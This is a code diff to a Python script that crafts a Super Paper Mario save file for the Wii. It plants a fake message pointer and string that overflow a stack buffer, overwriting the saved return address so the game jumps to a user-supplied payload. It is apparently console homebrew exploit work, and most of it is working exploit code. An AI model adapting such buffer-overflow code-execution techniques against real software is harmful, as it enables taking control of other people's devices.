@@ -1,8 +1,49 @@
+"""
+Makes a save file to load and execute a payload
+
+Save file parts used:
+    MarioPouchWork.shopItems: fake descMsg pointer
+    MarioPouchWork.catchCards: fake descMsg string
+    SpmarioGlobals.gsw[0x400]+: payload
+
+This script makes no assumptions about the payload itself, other
+than it expecting to run from the gsw position
+"""
+
 from argparse import ArgumentParser
 from math import ceil
+from struct import pack_into
 from typing import Tuple
 
-from common import be32, LoaderType, write_bytes, write_str, write_u16, write_u32
+"""
+Big endian binary helpers
+"""
+
+def be32(val: int) -> bytes:
+    """Converts an integer to big-endian 32-bit"""
+
+    return int.to_bytes(val, 4, "big")
+
+
+def write_u32(data: bytearray, offs: int, val: int):
+    pack_into(">I", data, offs, val)
+
+
+def write_u16(data: bytearray, offs: int, val: int):
+    pack_into(">H", data, offs, val)
+
+
+def write_bytes(data: bytearray, offs: int, val: bytes):
+    data[offs:offs+len(val)] = val
+
+
+def write_str(data: bytearray, offs: int, val: str):
+    enc = val.encode("ascii") + b"\x00"
+    write_bytes(data, offs, enc)
+
+"""
+Game struct definitions, no exploit implementation specific logic or information
+"""
 
 class ItemData:
     """ItemData struct constants"""
@@ -25,6 +66,7 @@ class SpmarioGlobals:
     OFFS_SAVE_NAME = 0x20
     OFFS_MAP_NAME = 0x44
     OFFS_GSW = 0x544
+    OFFS_COIN_ENTRIES = 0x1184
 
     ADDR = {
         "eu0": 0x80525550
@@ -104,17 +146,9 @@ class StackFrame:
     OFFS_LR_SAVE = SIZE + 4
     OFFS_STR = 0x10
 
-
-LOADER_TYPE = LoaderType.SAVE
-LOADER_VERSION = 1
-
 """
-Save file parts used:
-    MarioPouchWork.shopItems: fake descMsg pointer
-    MarioPouchWork.catchCards: fake descMsg string
-    SpmarioGlobals.gsw[0x400]+: payload
+Exploit implementation
 """
-
 
 def find_desc_msg_loc(version: str) -> Tuple[int, int]:
     """Finds an item id and offset that can be used for a fake descMsg pointer
@@ -134,12 +168,19 @@ def find_desc_msg_loc(version: str) -> Tuple[int, int]:
     return item_id, pouch_offs
 
 
-def make_exploit_string(loader_addr: int) -> bytes:
+def make_exploit_string(payload_addr: int) -> bytes:
+    """Makes the string to copy onto the stack in the buffer overflow
+    
+    This string overwrites the lr save of the stack frame above with the payload address
+    """
     padding = b"\x11" * (StackFrame.OFFS_LR_SAVE - StackFrame.OFFS_STR)
-    return padding + be32(loader_addr) + b"\x00"
+    return padding + be32(payload_addr) + b"\x00"
 
 
 def patch_wiimario(spmg: bytes, pouch: bytes, payload: bytes, version: str) -> Tuple[bytes, bytes]:
+    """Patches a wiimario save file's SpmarioGlobals and MarioPouchWork sections to execute a
+    payload through the exploit"""
+
     spmg = bytearray(spmg)
     pouch = bytearray(pouch)
 
@@ -148,6 +189,7 @@ def patch_wiimario(spmg: bytes, pouch: bytes, payload: bytes, version: str) -> T
     desc_msg_addr = MarioPouchWork.ADDR[version] + desc_msg_offs
     item_id, desc_msg_ptr_offs = find_desc_msg_loc(version)
     payload_offs = SpmarioGlobals.OFFS_GSW + 0x400
+    assert payload_offs + len(payload) < SpmarioGlobals.OFFS_COIN_ENTRIES, "Payload too big"
     payload_addr = SpmarioGlobals.ADDR[version] + payload_offs
 
     # Write exploit string
@@ -163,8 +205,6 @@ def patch_wiimario(spmg: bytes, pouch: bytes, payload: bytes, version: str) -> T
     # Write payload
     write_bytes(spmg, payload_offs, payload)
     
-    # TODO: size asserts
-
     return bytes(spmg), bytes(pouch)
 
 if __name__ == "__main__":
@@ -179,10 +219,6 @@ if __name__ == "__main__":
     # Get payload data
     with open(args.payload_path, "rb") as f:
         payload = f.read()
-
-    # Patch header
-    # TODO: rework context stuff
-    # payload = patch_context(payload, LOADER_TYPE, LOADER_VERSION)
 
     spmg = SpmarioGlobals.make_default(args.save_name, "dos_01")
     pouch = MarioPouchWork.make_default()
